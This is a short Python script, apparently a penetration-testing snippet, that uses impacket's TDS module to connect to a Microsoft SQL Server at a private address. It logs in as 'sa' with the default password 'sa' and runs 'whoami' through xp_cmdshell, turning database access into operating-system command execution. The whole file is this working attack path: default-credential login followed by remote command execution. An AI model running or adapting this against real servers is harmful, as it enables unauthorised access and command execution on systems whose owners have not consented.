import logging
from impacket.examples import logger
from impacket.examples.utils import parse_target
from lib import tds
import cmd

logger.init(False)
logging.getLogger().setLevel(logging.INFO)
ms_sql = tds.MSSQL("192.168.128.224", int(1433))
ms_sql.connect()
res = ms_sql.login("master", "sa", "sa", ".", None, None)
ms_sql.printReplies()
test=ms_sql.sql_query('''exec xp_cmdshell "whoami"''')
if not ms_sql.printReplies():
    print(1111)
ms_sql.printRows()